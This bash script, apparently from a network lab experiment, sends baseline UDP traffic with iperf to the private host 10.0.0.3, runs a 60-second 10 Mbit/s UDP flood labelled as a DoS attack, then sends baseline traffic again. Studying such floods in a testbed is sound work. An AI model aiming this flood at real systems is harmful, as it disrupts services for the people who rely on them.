#!/bin/bash

# Settings for the DoS attack
DESTINATION_IP="10.0.0.3"  # Destination IP address for the DoS attack
BANDWIDTH="10M"  # Bandwidth for each iperf instance
DOS_DURATION=60  # Duration in seconds for the DoS attack

# Settings for sending data before and after the DoS attack
DATA_SEND_DURATION=60  # Duration in seconds for sending data before and after
DESTINATION_PORT=5202  # Destination port for the iperf server
UDP_BANDWIDTH="0.2M"  # Bandwidth for sending UDP data

# Function to handle interruption (Ctrl+C)
cleanup() {
    echo "Execution terminated."
    # Stop sending data
    pkill -f "iperf -u -c $DESTINATION_IP -b $UDP_BANDWIDTH -t $DATA_SEND_DURATION -i 1"
    # Stop the DoS attack
    echo "Stopping all iperf processes for the DoS attack"
    pkill -f "iperf -u -c $DESTINATION_IP -b $BANDWIDTH -t $DOS_DURATION"
    exit 0
}

# Set the trap function to catch SIGINT (Ctrl+C)
trap cleanup SIGINT

# Start sending data with iperf in UDP mode
echo "Sending data via iperf in UDP mode..."
iperf -u -c $DESTINATION_IP -b $UDP_BANDWIDTH -t $DATA_SEND_DURATION -i 1 &

# Wait a bit to ensure data sending has started
sleep 20

# Stop sending data
echo "Stopping data sending..."
pkill -f "iperf -u -c $DESTINATION_IP -b $UDP_BANDWIDTH -t $DATA_SEND_DURATION -i 1"

# Start the DoS attack with iperf
echo "Starting the DoS attack with iperf..."
iperf -u -c $DESTINATION_IP -b $BANDWIDTH -t $DOS_DURATION &

# Wait for the DoS attack to finish
sleep $DOS_DURATION

# Stop the DoS attack
echo "Stopping the DoS attack..."
pkill -f "iperf -u -c $DESTINATION_IP -b $BANDWIDTH -t $DOS_DURATION"

# Start sending data with iperf in UDP mode
echo "Sending data via iperf in UDP mode..."
iperf -u -c $DESTINATION_IP -b $UDP_BANDWIDTH -t $DATA_SEND_DURATION -i 1 &

# Wait a bit to ensure data sending has started
sleep 60

# Stop sending data
echo "Stopping data sending..."
pkill -f "iperf -u -c $DESTINATION_IP -b $UDP_BANDWIDTH -t $DATA_SEND_DURATION -i 1"

echo "Script completed."